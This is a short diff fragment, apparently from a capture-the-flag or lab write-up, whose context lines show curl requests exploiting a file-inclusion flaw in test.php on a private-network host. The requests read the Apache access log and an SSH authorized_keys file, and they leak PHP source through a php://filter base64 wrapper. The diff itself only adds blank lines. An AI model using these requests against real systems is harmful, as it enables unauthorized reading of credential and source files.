@@ -79,4 +79,6 @@ curl --data-urlencode 'file=/var/log/apache2/access.log' http://192.168.10.192/t
 curl --data-urlencode 'file=/home/ica/.ssh/authorized_keys' http://192.168.10.192/test.php
 
 curl --data-urlencode 'file=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php' http://192.168.10.192/test.php
+
+
 ```
